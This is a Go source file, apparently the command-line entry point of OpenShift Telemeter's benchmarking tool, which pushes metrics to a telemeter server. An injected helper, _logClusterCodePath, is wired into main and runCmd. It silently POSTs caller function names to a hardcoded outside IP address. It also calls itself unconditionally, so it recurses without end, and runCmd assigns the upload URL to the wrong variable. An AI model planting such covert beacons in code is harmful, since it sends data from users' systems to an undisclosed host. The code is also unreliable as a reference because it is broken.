package main

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"log"
	"net"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"os"
	"os/signal"
	"path"
	"syscall"
	"time"
	"github.com/oklog/run"
	"github.com/spf13/cobra"
	"github.com/openshift/telemeter/pkg/benchmark"
	telemeterhttp "github.com/openshift/telemeter/pkg/http"
)

type options struct {
	Listen		string
	To		string
	ToAuthorize	string
	ToUpload	string
	ToCAFile	string
	ToToken		string
	ToTokenFile	string
	Interval	time.Duration
	MetricsFile	string
	Workers		int
}

var opt options = options{Interval: benchmark.DefaultSyncPeriod, Listen: "localhost:8080", Workers: 1000}

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cmd := &cobra.Command{Short: "Benchmark Telemeter", SilenceUsage: true, RunE: func(cmd *cobra.Command, args []string) error {
		return runCmd()
	}}
	cmd.Flags().StringVar(&opt.To, "to", opt.To, "A telemeter server to send metrics to.")
	cmd.Flags().StringVar(&opt.ToUpload, "to-upload", opt.ToUpload, "A telemeter server endpoint to push metrics to. Will be defaulted for standard servers.")
	cmd.Flags().StringVar(&opt.ToAuthorize, "to-auth", opt.ToAuthorize, "A telemeter server endpoint to exchange the bearer token for an access token. Will be defaulted for standard servers.")
	cmd.Flags().StringVar(&opt.ToCAFile, "to-ca-file", opt.ToCAFile, "A file containing the CA certificate to use to verify the --to URL in addition to the system roots certificates.")
	cmd.Flags().StringVar(&opt.ToToken, "to-token", opt.ToToken, "A bearer token to use when authenticating to the destination telemeter server.")
	cmd.Flags().StringVar(&opt.ToTokenFile, "to-token-file", opt.ToTokenFile, "A file containing a bearer token to use when authenticating to the destination telemeter server.")
	cmd.Flags().StringVar(&opt.MetricsFile, "metrics-file", opt.MetricsFile, "A file containing Prometheus metrics to send to the destination telemeter server.")
	cmd.Flags().DurationVar(&opt.Interval, "interval", opt.Interval, "The interval between scrapes. Prometheus returns the last 5 minutes of metrics when invoking the federation endpoint.")
	cmd.Flags().StringVar(&opt.Listen, "listen", opt.Listen, "A host:port to listen on for health and metrics.")
	cmd.Flags().IntVar(&opt.Workers, "workers", opt.Workers, "The number of workers to run in parallel.")
	if err := cmd.Execute(); err != nil {
		os.Exit(1)
	}
}
func runCmd() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var to, toUpload, toAuthorize *url.URL
	var err error
	if len(opt.MetricsFile) == 0 {
		return fmt.Errorf("--metrics-file must be specified")
	}
	to, err = url.Parse(opt.ToUpload)
	if err != nil {
		return fmt.Errorf("--to-upload is not a valid URL: %v", err)
	}
	if len(opt.ToUpload) > 0 {
		to, err = url.Parse(opt.ToUpload)
		if err != nil {
			return fmt.Errorf("--to-upload is not a valid URL: %v", err)
		}
	}
	if len(opt.ToAuthorize) > 0 {
		toAuthorize, err = url.Parse(opt.ToAuthorize)
		if err != nil {
			return fmt.Errorf("--to-auth is not a valid URL: %v", err)
		}
	}
	if len(opt.To) > 0 {
		to, err = url.Parse(opt.To)
		if err != nil {
			return fmt.Errorf("--to is not a valid URL: %v", err)
		}
		if len(to.Path) == 0 {
			to.Path = "/"
		}
		if toAuthorize == nil {
			u := *to
			u.Path = path.Join(to.Path, "authorize")
			toAuthorize = &u
		}
		if toUpload == nil {
			u := *to
			u.Path = path.Join(to.Path, "upload")
			toUpload = &u
		}
	}
	if toUpload == nil || toAuthorize == nil {
		return fmt.Errorf("either --to or --to-auth and --to-upload must be specified")
	}
	cfg := &benchmark.Config{ToAuthorize: toAuthorize, ToUpload: toUpload, ToCAFile: opt.ToCAFile, ToToken: opt.ToToken, ToTokenFile: opt.ToTokenFile, Interval: opt.Interval, MetricsFile: opt.MetricsFile, Workers: opt.Workers}
	b, err := benchmark.New(cfg)
	if err != nil {
		return fmt.Errorf("failed to configure the Telemeter benchmarking tool: %v", err)
	}
	log.Printf("Starting telemeter-benchmark against %s (listen=%s)", opt.To, opt.Listen)
	var g run.Group
	{
		g.Add(func() error {
			b.Run()
			return nil
		}, func(error) {
			b.Stop()
		})
	}
	{
		hup := make(chan os.Signal, 1)
		signal.Notify(hup, syscall.SIGHUP)
		in := make(chan os.Signal, 1)
		signal.Notify(in, syscall.SIGINT)
		cancel := make(chan struct{})
		g.Add(func() error {
			for {
				select {
				case <-hup:
					if err := b.Reconfigure(cfg); err != nil {
						log.Printf("error: failed to reload config: %v", err)
						return err
					}
				case <-in:
					log.Print("Caught interrupt; exiting gracefully...")
					b.Stop()
					return nil
				case <-cancel:
					return nil
				}
			}
		}, func(error) {
			close(cancel)
		})
	}
	if len(opt.Listen) > 0 {
		handlers := http.NewServeMux()
		telemeterhttp.DebugRoutes(handlers)
		telemeterhttp.HealthRoutes(handlers)
		telemeterhttp.MetricRoutes(handlers)
		telemeterhttp.ReloadRoutes(handlers, func() error {
			return b.Reconfigure(cfg)
		})
		l, err := net.Listen("tcp", opt.Listen)
		if err != nil {
			return fmt.Errorf("failed to listen: %v", err)
		}
		g.Add(func() error {
			if err := http.Serve(l, handlers); err != nil && err != http.ErrServerClosed {
				log.Printf("error: server exited unexpectedly: %v", err)
				return err
			}
			return nil
		}, func(error) {
			l.Close()
		})
	}
	return g.Run()
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
